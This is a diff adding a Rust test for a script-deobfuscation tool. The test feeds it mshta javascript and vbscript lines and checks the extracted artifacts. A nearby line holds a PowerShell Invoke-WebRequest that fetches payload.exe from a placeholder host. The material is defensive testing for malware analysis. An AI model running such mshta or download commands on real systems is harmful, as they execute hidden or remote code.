@@ -398,6 +398,42 @@ fn deob_writes_extracted_vbs() {
 }
 
 #[test]
+fn deob_writes_same_bytes_extracted_jscript_and_vbs() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        "mshta javascript:shared_payload\r\nmshta vbscript:shared_payload\r\n",
+    )
+    .expect("write");
+    let out_dir = dir.path().join("out");
+    Command::cargo_bin("harrington")
+        .expect("bin")
+        .args([
+            "deob",
+            input.to_str().expect("path"),
+            "-o",
+            out_dir.to_str().expect("path"),
+        ])
+        .assert()
+        .success();
+
+    let entries: Vec<_> = fs::read_dir(&out_dir)
+        .expect("read out")
+        .filter_map(|e| e.ok())
+        .map(|e| e.file_name().to_string_lossy().to_string())
+        .collect();
+    assert!(
+        entries.iter().any(|name| name.ends_with(".js")),
+        "same-bytes JScript artifact missing: {entries:?}"
+    );
+    assert!(
+        entries.iter().any(|name| name.ends_with(".vbs")),
+        "same-bytes VBScript artifact missing: {entries:?}"
+    );
+}
+
+#[test]
 fn deob_writes_normalized_ps1_when_readability_improves() {
     use base64::Engine;
     let decoded = "Invoke-WebRequest -Uri 'https://readable.example/payload.exe'";
